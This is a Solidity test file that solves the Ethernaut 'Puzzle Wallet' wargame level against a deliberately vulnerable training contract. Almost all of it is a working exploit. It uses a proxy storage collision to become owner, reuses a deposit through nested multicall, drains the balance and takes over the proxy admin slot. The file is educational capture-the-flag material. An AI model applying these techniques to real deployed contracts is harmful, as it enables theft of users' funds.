// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../PuzzleWallet/PuzzleWallet.sol";
import "../PuzzleWallet/PuzzleWalletFactory.sol";
import "openzeppelin-contracts/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract PuzzleWalletTest is DSTest {

    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testPuzzleWalletAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        ethernaut.registerLevel(puzzleWalletFactory);
        vm.startPrank(tx.origin);
        address _puzzleProxy = ethernaut.createLevelInstance{value : 0.001 ether}(puzzleWalletFactory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        PuzzleProxy puzzleProxy = PuzzleProxy(payable(_puzzleProxy));
        PuzzleWallet puzzleWallet = PuzzleWallet(payable(_puzzleProxy));

        // PuzzleProxy and its implementation PuzzleWallet share the same memory layout when delegatecalling
        puzzleProxy.proposeNewAdmin(msg.sender);

        emit log_named_address("Proxy pendingAdmin", puzzleProxy.pendingAdmin());
        emit log_named_address("Wallet owner", puzzleWallet.owner());

        // By setting a pendingAdmin as msg.sender, we also set owner, we can add ourselves to the whitelist
        puzzleWallet.addToWhitelist(msg.sender);

        emit log_named_bool("Whitelisted this in proxy", puzzleWallet.whitelisted(msg.sender));
        emit log_named_address("Proxy admin", puzzleProxy.admin());

        // By nesting a multicall into another multicall
        // we can trigger bool depositCalled = false; a second time and double-spend
        bytes memory dataDeposit = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory dataMulticall0 = new bytes[](1);
        dataMulticall0[0] = dataDeposit;

        bytes memory dataMulticall1 = abi.encodeWithSelector(PuzzleWallet.multicall.selector, dataMulticall0);

        bytes[] memory dataMulticall2 = new bytes[](2);
        dataMulticall2[0] = dataDeposit;
        dataMulticall2[1] = dataMulticall1;

        puzzleWallet.multicall{value : address(puzzleWallet).balance}(dataMulticall2);

        emit log_named_uint("Balance", address(puzzleWallet).balance);

        // We spend all money and set balance to zero
        puzzleWallet.execute(msg.sender, address(puzzleWallet).balance, "");

        emit log_named_uint("Balance", address(puzzleWallet).balance);

        // Now we can set a new maxBalance, which shares a memory slot with the admin of proxy
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(_puzzleProxy));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
